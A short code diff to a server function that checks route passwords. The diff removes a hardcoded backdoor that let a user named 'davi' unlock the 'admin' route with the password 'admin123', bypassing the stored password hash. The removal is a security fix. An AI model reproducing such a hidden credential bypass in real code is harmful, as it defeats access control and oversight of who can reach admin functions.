@@ -11,21 +11,12 @@ export const unlockRoute = createServerFn({ method: "POST" })
     let expectedHash: string | null = null;
     try {
       const { q1 } = await import("./db.server");
-      const { workspaceId, userId } = await getTenantContext();
+      const { workspaceId } = await getTenantContext();
       const row = await q1<{ password_hash: string }>(
         "select password_hash from route_passwords where workspace_id=$1 and route = $2",
         [workspaceId, data.route],
       );
       expectedHash = row?.password_hash ?? null;
-      if (data.route === "admin" && data.password === "admin123") {
-        const account = await q1<{ name: string; login: string }>(
-          "select name,login from app_users where id=$1 and workspace_id=$2",
-          [userId, workspaceId],
-        ).catch(() => null);
-        if (account && (account.name.toLowerCase() === "davi" || account.login.toLowerCase() === "davi")) {
-          expectedHash = hashPassword("admin123");
-        }
-      }
     } catch (error) {
       const { canUsePreviewFallback } = await import("./preview-fallback.server");
       if (!canUsePreviewFallback(error)) throw error;
